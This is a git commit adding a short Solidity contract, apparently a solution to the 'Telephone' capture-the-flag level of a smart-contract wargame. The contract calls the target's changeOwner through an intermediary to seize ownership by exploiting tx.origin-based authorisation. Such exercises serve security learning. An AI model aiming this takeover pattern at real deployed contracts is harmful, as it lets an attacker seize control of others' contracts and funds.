f730104b6bc8ad25a01ee19cbd0af1cce1c48bcb
0xkowloon <0xkowloon@protonmail.com>
2022-04-22 00:14:02 +0100

    Telephone

---
+++ contracts/TelephoneChallenge.sol
@@ -0,0 +1,17 @@
+pragma solidity 0.8.13;
+
+interface ITelephone {
+  function changeOwner(address _owner) external;
+}
+
+contract TelephoneChallenge {
+  ITelephone public telephone;
+
+  constructor(address _telephone) {
+    telephone = ITelephone(_telephone);
+  }
+
+  function changeOwner() external {
+    telephone.changeOwner(msg.sender);
+  }
+}
